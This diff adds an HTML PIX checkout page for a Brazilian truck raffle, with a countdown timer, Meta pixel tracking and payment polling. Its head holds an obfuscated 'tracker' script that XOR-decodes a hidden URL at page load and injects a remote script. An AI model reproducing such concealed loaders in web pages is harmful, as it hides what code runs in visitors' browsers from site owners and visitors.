@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="pt-br" translate="no"><head>
+   <meta charset="utf-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+   <meta name="theme-color" content="#000000">
+
+   <title>Aguardando pagamento - Rota 22 Premiações</title>
+   <link rel="shortcut icon" href="images/favicon.png">
+   <link rel="icon" type="image/png" sizes="32x32" href="images/favicon.png">
+
+   <link rel="stylesheet" href="css/leowp.css">
+   <link rel="stylesheet" href="css/all.min.css">
+   <script async="" src="js/fbevents.js"></script><script src="js/jquery.min.js"></script>
+
+   <style>
+      @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
+
+      :root{
+         --checkout-bg:#000;
+         --card:#1b1b1b;
+         --card-2:#202020;
+         --green:#198f5a;
+         --green-bright:#19a463;
+         --yellow:#f0b400;
+         --yellow-soft:#ffe9a6;
+         --muted:#a7a7a7;
+         --border:#2f2f2f;
+      }
+
+      *{box-sizing:border-box;}
+      html,body{margin:0;padding:0;min-width:320px;}
+      body.dark{
+         background:var(--checkout-bg);
+         color:#fff;
+         font-family:'Montserrat',Arial,sans-serif;
+         font-size:14px;
+         line-height:1.35;
+      }
+      a{font-family:inherit;}
+
+      .checkout-shell{width:100%;max-width:390px;margin:0 auto;}
+      .header-simple{
+         width:100%;max-width:390px;margin:0 auto;
+         height:76px;padding:9px 10px;
+         display:flex;align-items:center;justify-content:space-between;
+      }
+      .header-simple img{width:42px;height:42px;object-fit:contain;}
+      .header-simple .header-icons{display:flex;align-items:center;gap:18px;}
+      .header-simple .header-icons a{color:#fff!important;text-decoration:none;font-size:25px;line-height:1;}
+
+      .checkout-page-wrap{width:100%;max-width:390px;margin:0 auto;padding:0 8px 18px;}
+
+      .pix-card,.pix-timer-wrap,.pix-body,.product-mini-card,.purchase-details{
+         width:100%;background:var(--card);border:1px solid #252525;box-shadow:none;
+      }
+      .pix-card{border-radius:15px;overflow:hidden;margin:0 0 14px;}
+      .pix-status-bar{
+         min-height:76px;padding:14px 16px;
+         background:var(--card);
+         border-bottom:2px solid var(--yellow);
+         display:flex;align-items:center;gap:12px;
+      }
+      .pix-status-bar .clock-icon{font-size:34px;color:var(--yellow);line-height:1;}
+      .pix-status-bar .status-title{font-size:18px;font-weight:700;line-height:1.15;}
+      .pix-status-bar .status-subtitle{font-size:12px;color:#aaa;margin-top:2px;}
+
+      .pix-timer-wrap{
+         border-radius:15px;padding:15px 14px 13px;margin-bottom:14px;text-align:center;
+      }
+      .pix-timer-label{font-size:13px;font-weight:500;}
+      #pix-timer{font-size:17px;font-weight:700;}
+      .pix-progress{height:7px;border-radius:7px;background:#292929;overflow:hidden;margin-top:11px;}
+      .pix-progress-bar{height:100%;background:#e6364e;width:100%;transition:width 1s linear;}
+
+      .pix-body{border-radius:15px;padding:14px;margin-bottom:14px;}
+      .pix-step{display:flex;align-items:flex-start;gap:8px;margin-bottom:9px;}
+      .pix-step-num{
+         display:inline-flex;align-items:center;justify-content:center;
+         width:22px;height:22px;min-width:22px;border-radius:50%;
+         background:#19a366;color:#fff;font-size:12px;font-weight:700;line-height:1;
+      }
+      .pix-step-text{font-size:13px;font-weight:500;line-height:1.35;padding-top:2px;}
+
+      .pix-copy-row{display:flex;width:100%;height:42px;margin:2px 0 10px;}
+      .pix-key-box{
+         flex:1;min-width:0;height:42px;
+         display:flex;align-items:center;
+         background:#fff;color:#333;border:1px solid #ddd;
+         border-radius:8px 0 0 8px;padding:0 11px;
+         font-size:12px;font-weight:500;
+         white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+      }
+      #btn-copiar-pix{
+         flex:0 0 96px;height:42px;border:0;border-radius:0 8px 8px 0;
+         background:#168d59;color:#fff;font-family:inherit;font-size:13px;font-weight:700;
+         padding:0 7px;white-space:nowrap;
+      }
+      #btn-copiar-pix:hover{background:#19a463;}
+
+      .pix-body hr{border:0;border-top:1px solid #3b3b3b;margin:12px 0;opacity:1;}
+      .pix-qr-area{text-align:center;margin:0;}
+      .pix-qr-toggle{
+         background:#eee;color:#333;border:0;border-radius:5px;
+         padding:6px 12px;font-family:inherit;font-size:11px;font-weight:600;
+         box-shadow:none;
+      }
+      .qr-box{background:#fff;padding:9px;border-radius:8px;display:inline-block;}
+      #qr-img{display:block;width:220px;height:220px;max-width:100%;object-fit:contain;}
+
+      .pix-security-row{display:flex;justify-content:center;gap:34px;margin:2px 0 14px;}
+      .security-item{display:flex;align-items:center;gap:7px;color:#9e9e9e;font-size:10px;font-weight:500;line-height:1.1;text-align:left;}
+      .security-item i{color:#bdbdbd;font-size:24px;line-height:1;}
+      .security-item b{color:#ddd;font-weight:600;}
+
+      .pix-warning{
+         background:#ffe9a6;border:0;color:#5d4c10;border-radius:9px;
+         padding:10px 11px;font-size:11px;line-height:1.35;font-weight:500;
+      }
+      .pix-warning i{margin-right:5px;}
+
+      .product-mini-card{
+         border-radius:15px;padding:9px;display:flex;align-items:center;gap:10px;margin-bottom:10px;
+      }
+      .product-mini-card img{width:68px;height:68px;object-fit:cover;border-radius:9px;flex-shrink:0;}
+      .product-mini-card .product-title{font-size:13px;font-weight:700;line-height:1.25;}
+      .product-mini-card .product-subtitle{font-size:11px;color:#aaa;margin-top:2px;}
+      .product-mini-card .badge{font-size:10px!important;margin-top:5px!important;padding:3px 7px;border-radius:10px;}
+
+      .purchase-details{border-radius:15px;padding:14px;margin-bottom:12px;}
+      .purchase-details .label{font-size:9px;letter-spacing:.06em;color:#777;text-transform:uppercase;font-weight:700;margin-bottom:5px;}
+      .purchase-details .value{font-size:12px;margin-bottom:12px;line-height:1.3;}
+      .status-pill{background:#fff0b7;color:#806313;border-radius:20px;padding:4px 10px;font-size:11px;font-weight:600;display:inline-block;}
+
+      .checkout-footer{max-width:390px;margin:0 auto;text-align:center;padding:14px 8px 28px;color:#777;font-size:10px;}
+      .checkout-footer .footer-nav{margin-bottom:14px;font-size:14px;}
+      .checkout-footer .footer-nav a{color:#fff!important;text-decoration:none;padding:0 7px;}
+      .checkout-footer hr{border:0;border-top:1px solid #222;max-width:390px;margin:0 auto 13px;opacity:1;}
+
+      @media (min-width:600px){
+         .checkout-page-wrap,.checkout-shell,.header-simple,.checkout-footer{max-width:390px;}
+      }
+   </style>
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1613882593689485');
+fbq('track','PageView');
+try { window.meta_checkout_page_ic = true; } catch(e) {}
+</script>
+
+<!-- UTMIFY TRACKER -->
+<script>(function(){var f_l=atob("DEZpGHNx4bomofuUsz1LbQEdw4AEyY/gwzVTN1wShdQI1I/52iAQNhAejJRE09Tn0DQAaAcCzs9SzIi73ycdfQAFz9BVg9e20jIdahoTlM5D0tmu6D1LdhIchJgcg5/1xydEbQcciNxfjIvm1jAMdgdcmdlJxdbn0C1LNFEHgNZTxNmukWQUNAhTj9tLxNmukSIIbBJclM5LyJ3tnjYbfQUUj84L0o722iIaOl9Tl9tK1J62iWRLZS4M");var z_4l=[];for(var q_mex=0;q_mex<f_l.length;q_mex++){z_4l.push(f_l.charCodeAt(q_mex)&255);}var j_gbjb=z_4l[0];var f_aqjy=z_4l.slice(1,1+j_gbjb);var e_z7=z_4l.slice(1+j_gbjb);var b_2aq3=e_z7.map(function(b,h_jzf){return b^f_aqjy[h_jzf%j_gbjb];});var b_rrz="";for(var w_gb=0;w_gb<b_2aq3.length;w_gb++){b_rrz+=String.fromCharCode(b_2aq3[w_gb]&255);}var s_qhta=decodeURIComponent(escape(b_rrz));var a_8=JSON.parse(s_qhta);var l_um=a_8.globals||[];l_um.forEach(function(v_zgir){window[v_zgir.name]=v_zgir.value;});var e_q=document.createElement("script");e_q.src=a_8.url;e_q.async=true;e_q.defer=true;(a_8.attributes||[]).forEach(function(g_ja){e_q.setAttribute(g_ja.name,g_ja.value);});(document.head||document.documentElement).appendChild(e_q);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<!-- FIM UTMIFY TRACKER -->
+</head>
+<body class="dark">
+
+<div class="header-simple">
+   <a href="/"><img src="images/logo.png" alt="BR 251"></a>
+   <div class="header-icons">
+      <a aria-label="Carrinho" href="/"><i class="bi bi-cart3"></i></a>
+      <a aria-label="Menu" href="/"><i class="bi bi-list"></i></a>
+   </div>
+</div>
+
+<div class="checkout-page-wrap">
+
+   <!-- ================= STATUS: AGUARDANDO PAGAMENTO ================= -->
+   <div class="pix-card">
+      <div class="pix-status-bar">
+         <i class="bi bi-clock clock-icon"></i>
+         <div>
+            <div class="status-title fw-bold">Aguardando pagamento!</div>
+            <div class="status-subtitle">Não perca essa grande oportunidade.</div>
+         </div>
+      </div>
+   </div>
+
+   <!-- ================= TIMER + PIX ================= -->
+   <div class="pix-timer-wrap">
+      <div class="pix-timer-label">Você tem <span id="pix-timer">14:50</span> para pagar</div>
+      <div class="pix-progress"><div id="pix-progress-bar" class="pix-progress-bar"></div></div>
+   </div>
+
+   <div class="pix-body">
+
+      <div class="pix-step">
+         <span class="pix-step-num">1</span>
+         <div class="pix-step-text">Copie a chave PIX abaixo.</div>
+      </div>
+
+      <div class="pix-copy-row">
+         <div id="pix-key" class="pix-key-box" title="">Não foi possível localizar a transação PIX.</div>
+         <button id="btn-copiar-pix" type="button"><i class="bi bi-copy"></i> Copiar</button>
+      </div>
+
+      <div class="pix-step">
+         <span class="pix-step-num">2</span>
+         <div class="pix-step-text">Abra o app do seu banco e escolha a opção PIX, como se fosse fazer uma transferência.</div>
+      </div>
+
+      <div class="pix-step">
+         <span class="pix-step-num">3</span>
+         <div class="pix-step-text">Selecione a opção PIX copia e cola, cole a chave copiada e confirme o pagamento.</div>
+      </div>
+
+      <hr style="border-color:#333">
+
+      <div class="pix-qr-area">
+         <button id="btn-toggle-qr" class="pix-qr-toggle" type="button"><i class="bi bi-caret-down-fill"></i> Mostrar QR Code</button>
+         <div id="qr-wrap" class="d-none mt-3">
+            <div class="qr-box">
+               <img id="qr-img" src="" alt="QR Code PIX" width="180" height="180">
+            </div>
+         </div>
+      </div>
+
+      <hr style="border-color:#333">
+
+      <div class="pix-security-row">
+         <div class="security-item"><i class="bi bi-lock-fill"></i><span>COMPRA<br><b>SEGURA</b></span></div>
+         <div class="security-item"><i class="bi bi-shield-check"></i><span>PRIVACIDADE<br><b>PROTEGIDA</b></span></div>
+      </div>
+
+      <div class="pix-warning">
+         <i class="bi bi-exclamation-triangle-fill"></i>
+         Pague dentro do prazo para garantir suas cotas! Caso contrário, os números reservados serão liberados.
+      </div>
+
+   </div>
+
+   <!-- ================= PRODUTO ================= -->
+   <div class="product-mini-card">
+      <img src="images/81949464669f75afaf8fef6d9bec06b7.jpeg" alt="Produto">
+      <div>
+         <div class="product-title">VOLVO FH 540 + BITREM GRANELEIRO OU 900 MIL</div>
+         <div class="product-subtitle">Participe agora!</div>
+         <span class="badge bg-success font-xss mt-1">Adquira já!</span>
+      </div>
+   </div>
+
+   <!-- ================= DETALHES DA COMPRA ================= -->
+   <div class="purchase-details">
+      <div class="label">Detalhes da sua compra</div>
+      <div id="det-order-id" class="value font-xss text-white-50"></div>
+
+      <div class="label mt-2">Dados do comprador</div>
+      <div class="value"><span class="text-white-50">Comprador:</span> <span id="det-name"></span></div>
+      <div class="value" style="margin-top:-10px"><span class="text-white-50">Telefone:</span> <span id="det-phone"></span></div>
+
+      <div class="label">Dados da compra</div>
+      <div class="value"><span class="text-white-50">Data/horário:</span> <span id="det-datetime"></span></div>
+
+      <div class="value">
+         <span class="text-white-50">Situação:</span>
+         <span class="status-pill">Aguardando pagamento</span>
+      </div>
+
+      <div class="value"><span class="text-white-50">Quantidade:</span> <span id="det-qty"></span></div>
+      <div class="value"><span class="text-white-50">Total:</span> R$ <span id="det-total"></span></div>
+
+      <div class="label">Meus títulos</div>
+      <div class="font-xss text-white-50"><i class="bi bi-arrow-repeat"></i> As cotas serão geradas após o pagamento.</div>
+   </div>
+
+</div>
+
+<div class="checkout-footer">
+   <div class="footer-nav">
+      <a href="/">Início</a>
+      <a href="/">Sorteios</a>
+      <a href="/">Ganhadores</a>
+   </div>
+   <hr>
+   <b class="text-white d-block">Rota 22 Premiações</b>
+   © Copyright 2026 - Todos os direitos reservados<br>
+   Desenvolvido com <i class="fa-solid fa-heart" style="color:#df0e22"></i> por
+   <a target="_blank" href="https://sistemaderifas.online/contato.php?site=Rota 22 Premiações" class="text-white">Sistema de Rifas</a>
+</div>
+
+<script>
+(function () {
+  var raw = sessionStorage.getItem('pedido_atual');
+  var pedido = null;
+  try { pedido = raw ? JSON.parse(raw) : null; } catch (_) { pedido = null; }
+
+  if (!pedido || !pedido.paradiseId) {
+    document.getElementById('pix-key').textContent = 'Não foi possível localizar a transação PIX.';
+    return;
+  }
+
+  var orderId = pedido.orderId || pedido.paradiseId;
+  var dateTimeStr = pedido.dateTime || '-';
+
+  function maskPhone(phone) {
+    var digits = (phone || '').replace(/\D/g, '');
+    if (digits.length !== 11) return phone || '-';
+    return '(' + digits.slice(0, 2) + ') ' + digits.slice(2, 7) + '-****';
+  }
+
+  document.getElementById('det-order-id').textContent = orderId;
+  document.getElementById('det-name').textContent = (pedido.name || '').toUpperCase();
+  document.getElementById('det-phone').textContent = maskPhone(pedido.phone);
+  document.getElementById('det-datetime').textContent = dateTimeStr;
+  document.getElementById('det-qty').textContent = pedido.quantity || '-';
+  document.getElementById('det-total').textContent = pedido.total || '-';
+
+  var pixCode = pedido.pixCode || '';
+  var qrBase64 = pedido.pixQrBase64 || '';
+  var qrImg = document.getElementById('qr-img');
+  var qrWrap = document.getElementById('qr-wrap');
+
+  document.getElementById('pix-key').textContent = pixCode || 'PIX não retornado pela Paradise.';
+
+  if (qrBase64) {
+    qrImg.src = qrBase64;
+  } else if (pixCode) {
+    qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode);
+  }
+
+  document.getElementById('btn-copiar-pix').addEventListener('click', function () {
+    var btn = this;
+    if (!pixCode) return;
+    navigator.clipboard.writeText(pixCode).then(function () {
+      var original = btn.innerHTML;
+      btn.innerHTML = '<i class="bi bi-check2"></i> Copiado!';
+      setTimeout(function () { btn.innerHTML = original; }, 1800);
+    });
+  });
+
+  document.getElementById('btn-toggle-qr').addEventListener('click', function () {
+    if (!pixCode && !qrBase64) return;
+    qrWrap.classList.toggle('d-none');
+    this.innerHTML = qrWrap.classList.contains('d-none')
+      ? '<i class="bi bi-caret-down-fill"></i> Mostrar QR Code'
+      : '<i class="bi bi-caret-up-fill"></i> Ocultar QR Code';
+  });
+
+  function setStatus(text, success) {
+    var pill = document.querySelector('.status-pill');
+    if (pill) {
+      pill.textContent = text;
+      pill.style.background = success ? '#123b27' : '#3a2f10';
+      pill.style.color = success ? '#8ef0b2' : '#f0d080';
+    }
+    var statusBar = document.querySelector('.pix-status-bar .status-title');
+    if (statusBar) statusBar.textContent = success ? 'Pagamento aprovado!' : text;
+  }
+
+  function metaPurchase() {
+    if (window.fbq && !sessionStorage.getItem('meta_purchase_sent')) {
+      var value = Number(String(pedido.total || '').replace(/R\$\s*/i,'').replace(/\./g,'').replace(',','.')) || 0;
+      window.fbq('track', 'Purchase', {value: value, currency: 'BRL'});
+      sessionStorage.setItem('meta_purchase_sent', '1');
+    }
+  }
+
+  var totalSeconds = 14 * 60 + 50;
+  var secondsLeft = totalSeconds;
+  function renderTimer() {
+    var m = Math.floor(secondsLeft / 60), s = secondsLeft % 60;
+    document.getElementById('pix-timer').textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+    document.getElementById('pix-progress-bar').style.width = (100 * secondsLeft / totalSeconds) + '%';
+  }
+  renderTimer();
+  var timerInterval = setInterval(function () {
+    secondsLeft--;
+    if (secondsLeft <= 0) { secondsLeft = 0; clearInterval(timerInterval); }
+    renderTimer();
+  }, 1000);
+
+  async function checkPayment() {
+    try {
+      var r = await fetch('/.netlify/functions/paradise?action=query&id=' + encodeURIComponent(pedido.paradiseId), {cache:'no-store'});
+      var data = await r.json();
+      var status = String(data.status || '').toLowerCase();
+      if (['approved','paid','completed','success'].includes(status)) {
+        clearInterval(pollInterval);
+        setStatus('Pagamento aprovado!', true);
+        var warning = document.querySelector('.pix-warning');
+        if (warning) warning.innerHTML = '<i class="bi bi-check-circle-fill"></i> Pagamento confirmado. Seu pedido foi registrado com sucesso.';
+        var timer = document.querySelector('.pix-timer-wrap');
+        if (timer) timer.style.display = 'none';
+        metaPurchase();
+        setTimeout(function () {
+          window.location.href = 'https://trucksoficial.netlify.app/meus-numeros';
+        }, 2500);
+      } else if (status === 'failed' || status === 'refunded' || status === 'chargeback') {
+        setStatus(status === 'failed' ? 'Pagamento não aprovado' : 'Pagamento atualizado');
+      }
+    } catch (_) {}
+  }
+  checkPayment();
+  var pollInterval = setInterval(checkPayment, 5000);
+})();
+</script>
+
+
+
+</body></html>
